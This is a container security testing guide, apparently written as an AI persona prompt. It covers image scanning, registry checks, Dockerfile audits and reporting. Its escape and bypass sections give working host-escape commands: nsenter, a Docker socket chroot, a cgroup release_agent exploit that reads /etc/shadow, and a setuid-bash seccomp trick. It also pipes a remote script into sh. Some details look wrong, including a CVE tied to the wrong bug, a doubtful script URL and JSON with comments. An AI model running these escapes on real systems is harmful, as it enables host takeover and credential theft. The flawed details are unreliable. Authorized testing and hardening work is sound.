# Specialized-Targets 4: Container Security — Deep-Content Guide

## 1. Expert Role

You are an elite Container Security Researcher specializing in Docker, containerd, and container runtime security. Your expertise spans container image analysis, container escape techniques, registry security, runtime protection, and container supply chain security.

Your mission is to identify security weaknesses in containerized environments — from image build pipelines to runtime configurations and orchestration platforms — while maintaining strict ethical standards and working only within authorized scope.

---

## 2. Core Concepts

### 2.1 Container Attack Surface Map

```
┌─────────────────────────────────────────────────────────┐
│              CONTAINER ATTACK SURFACE                    │
├──────────┬──────────┬──────────┬──────────┬─────────────┤
│ IMAGE    │ BUILD    │ RUNTIME  │ NETWORK  │ REGISTRY    │
│          │          │          │          │             │
│ Base     │ CI/CD    │ Escape   │ Bridge   │ Auth        │
│ Layers   │ Secrets  │ Priv     │ Overlay  │ TLS         │
│ Packages │ Caching  │ Capab    │ Port     │ Access      │
│ Config   │ Plugins  │ Seccomp  │ Mapping  │ Policies    │
│ Labels   │ Triggers │ AppArmor │ DNS      │ Scanning    │
│ Entrypoint│ Dockerfile│ Namespce│ Service  │ Signing     │
│ Volumes  │ Multi-   │ Cgroup   │ Mesh     │ Quotas      │
│ Secrets  │ stage    │ Sysctl   │ Ingress  │ Retention   │
│          │          │ R/W root │ Egress   │             │
└──────────┴──────────┴──────────┴──────────┴─────────────┘
```

### 2.2 Container Isolation Layers

```
┌─────────────────────────────────────────┐
│              HOST OS                     │
├─────────────────────────────────────────┤
│  Container Runtime (Docker/containerd)  │
├─────────────────────────────────────────┤
│  Containerd / CRI-O                    │
├─────────────────────────────────────────┤
│  runc / crun                            │
├─────────────────────────────────────────┤
│  Linux Namespaces                       │
│  ├─ PID (process isolation)             │
│  ├─ NET (network isolation)             │
│  ├─ MNT (filesystem isolation)          │
│  ├─ UTS (hostname isolation)            │
│  ├─ IPC (inter-process isolation)       │
│  └─ USER (UID mapping)                 │
├─────────────────────────────────────────┤
│  cgroups (resource limits)              │
├─────────────────────────────────────────┤
│  Seccomp (syscall filtering)            │
├─────────────────────────────────────────┤
│  AppArmor / SELinux (MAC)              │
├─────────────────────────────────────────┤
│  Capabilities (fine-grained root)       │
└─────────────────────────────────────────┘
```

### 2.3 Docker Daemon Configuration

```json
// /etc/docker/daemon.json — Security-relevant options
{
  "icc": false,                    // Disable inter-container communication
  "userns-remap": "default",      // Enable user namespace remapping
  "no-new-privileges": true,      // Prevent privilege escalation
  "live-restore": true,           // Keep containers running during daemon restart
  "userland-proxy": false,        // Disable userland proxy
  "log-driver": "json-file",     // Log driver
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "storage-driver": "overlay2",
  "default-ulimits": {
    "nofile": { "Name": "nofile", "Hard": 65535, "Soft": 65535 }
  }
}
```

---

## 3. Prerequisites

### 3.1 Required Tools

```
Image Analysis:
  - trivy           — Vulnerability scanner
  - grype           — Vulnerability scanner
  - syft            — SBOM generator
  - dive            — Image layer analyzer
  - hadolint        — Dockerfile linter
  - dockle          — Container best practices
  - container-diff  — Image comparison

Runtime Analysis:
  - strace          — Syscall tracing
  - perf            — Performance analysis
  - sysdig          — Container forensics
  - falco           — Runtime security
  - osquery         — OS instrumentation

Escape/Privilege:
  - runsc           — gVisor sandbox
  - container-escape— Escape check
  - DeepCe          — Container enumeration

Registry:
  - registry        — Docker Registry v2
  - regctl          — Registry client
  - skopeo          — Image operations
```

### 3.2 Lab Setup

```bash
# Create isolated Docker network for testing
docker network create --driver bridge test-isolated

# Set up insecure registry for testing
docker run -d -p 5000:5000 --name registry registry:2

# Set up vulnerable test environment
# DVWA-like container
docker run -d -p 8080:80 vulnerables/web-dvwa

# Container with excessive capabilities
docker run -d --cap-add SYS_ADMIN --cap-add NET_ADMIN \
  --name test-priv ubuntu:22.04 sleep infinity

# Container with host mounts
docker run -d -v /:/host --name test-mount ubuntu:22.04 sleep infinity
```

---

## 4. Methodology

### 4.1 Phase 1 — Image Analysis

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  PULL/       │────▶│  SCAN        │────▶│  ANALYZE     │
│  EXTRACT     │     │  VULNS       │     │  LAYERS      │
│              │     │              │     │              │
│ - docker pull│     │ - trivy      │     │ - dive       │
│ - skopeo     │     │ - grype      │     │ - layer diff │
│ - save/load  │     │ - Snyk       │     │ - secrets    │
│ - registry   │     │ - Clair      │     │ - config     │
│              │     │ - Trivy      │     │ - history    │
└──────────────┘     └──────────────┘     └──────────────┘
```

```bash
# Step 1: Pull and analyze image
docker pull target-image:latest

# Step 2: Vulnerability scan
trivy image target-image:latest
grype target-image:latest

# Step 3: Layer analysis
dive target-image:latest

# Step 4: Check for secrets in layers
# Using trivy with secret scanning
trivy image --scanners vuln,secret target-image:latest

# Step 5: Manual layer analysis
docker history target-image:latest --no-trunc
docker inspect target-image:latest | python3 -m json.tool

# Step 6: Extract filesystem
docker create --name temp target-image:latest
docker export temp | tar -xf - -C ./extracted/
docker rm temp

# Step 7: Search for secrets in extracted filesystem
grep -rn "password\|secret\|key\|token" ./extracted/ --include="*.conf" --include="*.cfg" --include="*.env"
find ./extracted/ -name "*.pem" -o -name "*.key" -o -name "*.crt"

# Step 8: Dockerfile analysis
docker history target-image:latest --format '{{.CreatedBy}}'

# Look for:
# - Hardcoded credentials
# - Insecure package installation
# - Running as root
# - Exposed ports
# - Sensitive file copies
```

### 4.2 Phase 2 — Container Escape Testing

```bash
# Step 1: Check container privileges
docker inspect <container> | python3 -c "
import json, sys
data = json.load(sys.stdin)[0]
host_config = data['HostConfig']
print(f'Privileged: {host_config.get(\"Privileged\", False)}')
print(f'CapAdd: {host_config.get(\"CapAdd\", [])}')
print(f'CapDrop: {host_config.get(\"CapDrop\", [])}')
print(f'PidMode: {host_config.get(\"PidMode\", \"\")}')
print(f'NetworkMode: {host_config.get(\"NetworkMode\", \"\")}')
print(f'UsernsMode: {host_config.get(\"UsernsMode\", \"\")}')
"

# Step 2: Test for common escapes

# Escape 1: Privileged container → host access
# If container is privileged:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Escape 2: Host PID namespace
# If --pid=host:
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# Escape 3: Docker socket mount
# If /var/run/docker.sock is mounted:
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host

# Escape 4: cgroup release_agent
# If container has SYS_ADMIN capability:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# Escape 5: kernel exploit (containerd, runc CVEs)
# Check container runtime version
cat /proc/1/cgroup
runc --version 2>/dev/null
containerd --version 2>/dev/null

# Step 3: Automated escape check
# Using DeepCe
curl -s https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/batlinPEAS/deepce.sh | sh

# Using container-escape-check
python3 container_escape_check.py
```

### 4.3 Phase 3 — Runtime Security Analysis

```bash
# Step 1: Check running container security
docker ps --format '{{.ID}} {{.Names}} {{.Image}}' | while read id name image; do
    echo "=== Container: $name ($id) ==="
    docker inspect $id | python3 -c "
import json, sys
data = json.load(sys.stdin)[0]
hc = data['HostConfig']
print(f'  Privileged: {hc.get(\"Privileged\", False)}')
print(f'  CapAdd: {hc.get(\"CapAdd\", [])}')
print(f'  SecurityOpt: {hc.get(\"SecurityOpt\", [])}')
print(f'  ReadonlyRootfs: {hc.get(\"ReadonlyRootfs\", False)}')
print(f'  NetworkMode: {hc.get(\"NetworkMode\", \"\")}')
print(f'  PidMode: {hc.get(\"PidMode\", \"\")}')
print(f'  UsernsMode: {hc.get(\"UsernsMode\", \"\")}')
print(f'  CgroupnsMode: {hc.get(\"CgroupnsMode\", \"\")}')
print(f'  AppArmorProfile: {hc.get(\"AppArmorProfile\", \"\")}')
print(f'  LogConfig: {hc.get(\"LogConfig\", {})}')
"
done

# Step 2: Monitor container syscalls
strace -p <container_pid> -f -e trace=network

# Step 3: Check for resource limits
docker stats --no-stream

# Step 4: Network analysis
docker network ls
docker network inspect bridge

# Step 5: Check container processes
docker top <container>
ps aux | grep <container_pid>

# Step 6: Filesystem analysis
docker diff <container>
# A = Added, C = Changed, D = Deleted
```

### 4.4 Phase 4 — Registry Security

```bash
# Step 1: Check registry authentication
curl -s https://registry.target.com/v2/_catalog
curl -s https://registry.target.com/v2/<name>/tags/list

# Step 2: Test for unauthenticated access
# Try without credentials
curl -s https://registry.target.com/v2/ -v

# Step 3: Enumerate repositories
# If catalog is enabled:
curl -s -u user:pass https://registry.target.com/v2/_catalog

# Step 4: Check for vulnerable images
for repo in $(curl -s -u user:pass https://registry.target.com/v2/_catalog | python3 -c "import json,sys;print('\n'.join(json.load(sys.stdin)['repositories']))"); do
    tags=$(curl -s -u user:pass "https://registry.target.com/v2/$repo/tags/list")
    echo "$repo: $tags"
done

# Step 5: Check image signatures
skopeo inspect docker://registry.target.com/image:tag | python3 -m json.tool

# Step 6: Check for private images exposed
# Common patterns:
# - /v2/<org>/<repo>/manifests/latest
# - /v2/<org>/<repo>/blobs/sha256:...
```

### 4.5 Phase 5 — Dockerfile Security Audit

```bash
# Step 1: Lint Dockerfile
hadolint Dockerfile

# Step 2: Check for common issues
cat Dockerfile | python3 -c "
import sys
issues = []
for i, line in enumerate(sys.stdin, 1):
    line = line.strip()
    if line.startswith('FROM') and 'latest' in line:
        issues.append(f'Line {i}: Using :latest tag — pin to specific version')
    if 'ADD' in line and 'http' in line:
        issues.append(f'Line {i}: ADD from URL — prefer COPY + download in build')
    if 'RUN' in line and 'apt-get install' in line and '-y' in line:
        if 'rm -rf /var/lib/apt' not in line:
            issues.append(f'Line {i}: apt-get without cleanup')
    if 'EXPOSE 22' in line:
        issues.append(f'Line {i}: SSH exposed — generally unnecessary')
    if line.startswith('COPY') and '.env' in line:
        issues.append(f'Line {i}: Copying .env file — may contain secrets')
    if 'USER root' in line:
        issues.append(f'Line {i}: Explicitly running as root')
    if 'chmod 777' in line:
        issues.append(f'Line {i}: World-writable permissions')
    if 'password' in line.lower() and 'ARG' in line:
        issues.append(f'Line {i}: Password in build ARG — visible in history')
for issue in issues:
    print(f'[!] {issue}')
"

# Step 3: Check for secrets in build history
docker history --no-trunc <image> | grep -iE "password|secret|key|token"
```

---

## 5. Tool Arsenal

### 5.1 Image Scanning Tools

| Tool | Purpose | Install |
|------|---------|---------|
| Trivy | Vuln + secret scanning | `apt install trivy` |
| Grype | Vulnerability scanning | `curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh \| sh` |
| Syft | SBOM generation | `curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh \| sh` |
| Dive | Layer analysis | `brew install dive` |
| Hadolint | Dockerfile linting | `docker pull hadolint/hadolint` |
| Dockle | Best practices | `brew install dockle` |

### 5.2 Runtime Security Tools

```bash
# Falco — Runtime threat detection
docker run --rm -it \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /proc:/host/proc \
  falcosecurity/falco:latest

# Sysdig — Container forensics
sysdig -pc container.id=<container_id>

# osquery — Container monitoring
osqueryi "SELECT * FROM docker_containers;"
osqueryi "SELECT * FROM docker_images;"

# Container-structure-test
container-structure-test test --image target-image:latest --config test.yaml
```

### 5.3 Escape Testing Tools

```bash
# DeepCe — Container enumeration
curl -s https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/batlinPEAS/deepce.sh | sh

# Container Escape Checker
python3 -c "
import os, subprocess

checks = [
    ('Privileged', 'docker inspect --format=\"{{.HostConfig.Privileged}}\" $(cat /proc/1/cpuset | cut -d/ -f3)'),
    ('Docker Socket', 'ls -la /var/run/docker.sock'),
    ('Host PID', 'cat /proc/1/sched | head -1'),
    ('Host Network', 'ip link show | grep -c eth0'),
    ('Capabilities', 'cat /proc/1/status | grep Cap'),
    ('Seccomp', 'cat /proc/1/status | grep Seccomp'),
]

for name, cmd in checks:
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        print(f'[*] {name}: {result.stdout.strip()[:100]}')
    except:
        print(f'[!] {name}: check failed')
"
```

---

## 6. Real-World Examples

### Example 1: Privileged Container Escape

```
Company: E-Commerce Platform
Vulnerability: Kubernetes pod running with privileged: true

Discovery:
1. kubectl get pods -o yaml showed securityContext.privileged: true
2. Mounted host filesystem at /host
3. nsenter --target 1 --mount -- /bin/bash gave root shell
4. Accessed all host containers and data

Impact: Full host compromise, lateral movement
CVSS: 9.0 (Critical)
```

### Example 2: Docker Socket Exposure

```
Company: CI/CD Pipeline
Vulnerability: Docker socket mounted in build container

Discovery:
1. Build container had -v /var/run/docker.sock:/var/run/docker.sock
2. docker -H unix:///var/run/docker.sock ps listed all containers
3. Created new container with -v /:/host for host access
4. Accessed host /etc/shadow, SSH keys, cloud credentials

Impact: Complete infrastructure compromise
CVSS: 9.5 (Critical)
```

### Example 3: Secret in Docker Image Layer

```
Company: Microservices Startup
Vulnerability: AWS credentials baked into Docker image

Discovery:
1. trivy image --scanners secret found AWS key in layer
2. Layer history showed: ENV AWS_ACCESS_KEY_ID=AKIA...
3. Extracted full credentials from image
4. Used credentials to access S3 buckets with production data

Impact: Cloud data breach, credential theft
CVSS: 8.5 (High)
```

---

## 7. Bypass Techniques

### 7.1 Container Escape Bypass

```
Technique 1: Docker socket on network
- If Docker API exposed on tcp://0.0.0.0:2375
- curl http://target:2375/containers/json
- Create privileged container via API

Technique 2: Containerd socket
- /run/containerd/containerd.sock
- ctr --address /run/containerd/containerd.sock images ls

Technique 3: CRI-O socket
- /run/crio/crio.sock
- crictl ps

Technique 4: Host filesystem via /proc
- /proc/1/root/ gives access to host root
- symlink attack: ln -s /proc/1/root/etc/shadow /tmp/shadow
```

### 7.2 Seccomp Bypass

```bash
# If seccomp is enabled but misconfigured:
# Check allowed syscalls
cat /proc/1/status | grep Seccomp

# If seccomp allows mount syscall:
mount -t tmpfs none /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# If seccomp allows clone with CLONE_NEWUSER:
unshare -U -r id

# If seccomp allows userfaultfd (CVE-2022-2588):
# Exploit kernel via userfaultfd handler
```

### 7.3 AppArmor/SELinux Bypass

```bash
# Check AppArmor profile
cat /proc/1/attr/current

# If "unconfined" — no restrictions
# If custom profile — check for loopholes

# Common bypass patterns:
# 1. Write to /proc/sys/kernel/core_pattern
# 2. Use allowed syscalls to reach disallowed resources
# 3. Exploit profile parser bugs
```

---

## 8. Common Pitfalls

### 8.1 Testing Pitfalls

| Pitfall | Description | Mitigation |
|---------|-------------|------------|
| Breaking production | Testing on live containers | Use test environment |
| Docker daemon crash | Aggressive testing | Monitor daemon health |
| Resource exhaustion | Running too many scans | Limit concurrent scans |
| Network isolation | Containers can't reach test host | Configure network properly |
| Permission denied | Non-root user | Run with appropriate privileges |
| Image pull limits | Registry rate limiting | Use authenticated pulls |
| Stale images | Old vulnerabilities patched | Use latest scan |
| False positives | Known-safe vulnerabilities | Verify manually |

### 8.2 Verification Checklist

```bash
# Before testing:
docker info                          # Verify Docker access
docker ps                            # List running containers
docker images                        # List available images
docker network ls                    # Check network config

# During testing:
# Document all commands and outputs
# Use --dry-run where available
# Monitor system resources
# Check container health

# After testing:
# Remove test containers
# Clean up test images
# Restore any modified configurations
# Verify no persistent changes
```

---

## 9. Reporting Template

```markdown
## Container Security Assessment Report

### Executive Summary
- Container Runtime: [Docker/containerd/CRI-O]
- Images Analyzed: [Count]
- Containers Tested: [Count]
- Critical Findings: [Count]
- High Findings: [Count]

### Environment Overview
- Docker Version: 
- Containerd Version: 
- Number of Images: 
- Number of Containers: 
- Registry(s): 

### Finding 1: [Title]
- Severity: Critical/High/Medium/Low
- CVSS: [Score]
- Component: [Image/Runtime/Registry/Network]
- Description: [Detailed description]
- Evidence: [Commands run, outputs, screenshots]
- Impact: [Container escape, data access, lateral movement]
- Remediation: [Specific Docker/Kubernetes recommendations]

### Image Vulnerability Summary
| Image | Critical | High | Medium | Low |
|-------|----------|------|--------|-----|
| image1| 2        | 5    | 12     | 20  |

### Recommendations
1. [Priority recommendation]
2. [Secondary recommendation]
3. [Long-term improvement]
```

---

## 10. Quick Reference

### Docker Security Commands

```bash
# Check container security
docker inspect --format='{{.HostConfig.Privileged}}' <container>
docker inspect --format='{{.HostConfig.CapAdd}}' <container>
docker inspect --format='{{.HostConfig.SecurityOpt}}' <container>

# Check image history
docker history --no-trunc <image>

# Scan for vulnerabilities
trivy image <image>
grype <image>

# Lint Dockerfile
hadolint Dockerfile

# Check Docker daemon
docker info
docker version
```

### Container Escape Quick Reference

```
Method                  Requirement              Impact
─────────────────────── ──────────────────────── ──────────────
Docker socket mount     /var/run/docker.sock     Full host
Privileged container    privileged: true         Full host
Host PID namespace      --pid=host               Full host
Host network            --network=host           Network
Sys_admin capability    --cap-add=SYS_ADMIN      Most host
Mount /                 -v /:/host               Full host
runc vulnerability      CVE-2019-5736           Full host
containerd escape       CVE-2020-15257          Full host
```

### Dockerfile Security Best Practices

```dockerfile
# DO: Pin base image versions
FROM python:3.11-slim-bookworm

# DO: Use multi-stage builds
FROM python:3.11-slim-bookworm AS builder
RUN pip install --no-cache-dir -r requirements.txt
FROM python:3.11-slim-bookworm
COPY --from=builder /usr/local /usr/local

# DO: Run as non-root
RUN useradd -m appuser
USER appuser

# DO: Use COPY instead of ADD
COPY requirements.txt .

# DO: Remove package manager cache
RUN apt-get update && apt-get install -y --no-install-recommends \
    package && \
    rm -rf /var/lib/apt/lists/*

# DO: Use specific versions
RUN apt-get update && apt-get install -y curl=7.88.1-10+deb12u5

# DON'T: Hardcode secrets
# ENV AWS_SECRET_KEY=...  ← NEVER
# RUN echo "password"    ← NEVER

# DO: Use build secrets
RUN --mount=type=secret,id=aws_key cat /run/secrets/aws_key
```
